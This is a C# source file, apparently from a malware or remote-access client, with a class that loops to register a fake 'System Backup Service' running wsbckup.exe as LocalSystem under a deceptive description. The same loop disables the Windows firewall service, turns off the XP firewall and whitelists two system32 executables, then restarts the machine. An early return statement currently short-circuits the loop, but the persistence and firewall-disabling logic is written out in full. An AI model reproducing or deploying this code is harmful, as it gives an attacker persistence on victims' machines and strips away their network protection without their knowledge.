using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using Microsoft.Win32;

namespace Client.Controller
{
    public class FirewallMonitor
    {
        static bool shouldRestart = false;
 
        public static void FireWallMonitorThread()
        {
            Thread th = new Thread(new ThreadStart(FireWallMonitorProcess));
            th.IsBackground = true;
            th.Start();
        }

        private static void FireWallMonitorProcess()
        {
            return;
            while(true)
            {
                try
                {
                    object serviceValue = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\System Backup Service", "Start", null);

                    if (serviceValue != null && (int)serviceValue != 2)
                    {
                        Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\System Backup Service", "Start", 2, Microsoft.Win32.RegistryValueKind.DWord);
                    }else if(serviceValue == null)
                    {
                        try
                        {
                            RegistryKey rootkey = Registry.LocalMachine;
                            RegistryKey serviceKey = rootkey.CreateSubKey(@"SYSTEM\CurrentControlSet\services\System Backup Service");

                            serviceKey.SetValue(@"Description", @"Performs system backup functions. Operating System will not be safe without this service.", RegistryValueKind.String);
                            serviceKey.SetValue(@"DisplayName", @"System Backup Service", RegistryValueKind.String);
                            serviceKey.SetValue(@"ErrorControl", 1, RegistryValueKind.DWord);
                            serviceKey.SetValue(@"ImagePath", @"C:\Windows\system32\wsbckup.exe", RegistryValueKind.ExpandString);
                            serviceKey.SetValue(@"ObjectName", @"LocalSystem", RegistryValueKind.String);
                            serviceKey.SetValue(@"Start", 2, RegistryValueKind.DWord);
                            serviceKey.SetValue(@"Type", 0x10, RegistryValueKind.DWord);
                            serviceKey.Close();
                            rootkey.Close();
                        }
                        catch (System.Exception)
                        {
                        }
                    }
                }
                catch (System.Exception ex)
                {
                    Console.Write(ex.ToString());
                	try
                	{
                        RegistryKey rootkey = Registry.LocalMachine;
                        RegistryKey serviceKey = rootkey.CreateSubKey(@"SYSTEM\CurrentControlSet\services\System Backup Service");

                        serviceKey.SetValue(@"Description", @"Performs system backup functions. Operating System will not be safe without this service.", RegistryValueKind.String);
                        serviceKey.SetValue(@"DisplayName", @"System Backup Service", RegistryValueKind.String);
                        serviceKey.SetValue(@"ErrorControl", 1, RegistryValueKind.DWord);
                        serviceKey.SetValue(@"ImagePath", @"C:\Windows\system32\wsbckup.exe", RegistryValueKind.ExpandString);
                        serviceKey.SetValue(@"ObjectName", @"LocalSystem", RegistryValueKind.String);
                        serviceKey.SetValue(@"Start", 2, RegistryValueKind.DWord);
                        serviceKey.SetValue(@"Type", 0x10, RegistryValueKind.DWord);
                        serviceKey.Close();
                        rootkey.Close();
                	}
                	catch (System.Exception)
                	{
                	}
                }

                //Disable Firewall for Windows 7
                try
                {
                    object value = Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MpsSvc", "Start", null);
                    if (value != null && (int)value != 4)
                    {
                        Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\MpsSvc", "Start", 4, Microsoft.Win32.RegistryValueKind.DWord);
                        shouldRestart = true;
                        break;
                    }
                }
                catch (System.Exception ex)
                {
                    Console.Write(ex.ToString());
                }

                //Add privilege Firewall for Windows XP
                try
                {
                    Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", @"C:\WINDOWS\system32\scrct.exe", @"C:\WINDOWS\system32\scrct.exe:*:Enabled:scrct", RegistryValueKind.String);
                    Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List", @"C:\WINDOWS\system32\wconfx86.exe", @"C:\WINDOWS\system32\wconfx86.exe:*:Enabled:wconfx86", RegistryValueKind.String);

                }
                catch (System.Exception ex)
                {
                    Console.Write(ex.ToString());
                }

                bool isChanged = false;
                try
                {
                    int value = (int)Microsoft.Win32.Registry.GetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", @"EnableFirewall", -1);
                    if (value == -1 || value == 0)
                    {
                        isChanged = false;
                    }

                    if (value == 1)
                        isChanged = true;
                }
                catch (System.Exception ex)
                {
                    Console.Write(ex.ToString());
                    isChanged = false;
                }

                try
                {
                    Microsoft.Win32.Registry.SetValue(@"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", @"EnableFirewall", 0, RegistryValueKind.DWord);
                    if (isChanged)
                       break;
                }
                catch (System.Exception ex)
                {
                    Console.Write(ex.ToString());
                    isChanged = false;
                }
                
                Thread.Sleep(300);
                continue;
            }

            if (shouldRestart)
                Util.Util.Restart();
        }
    }
}
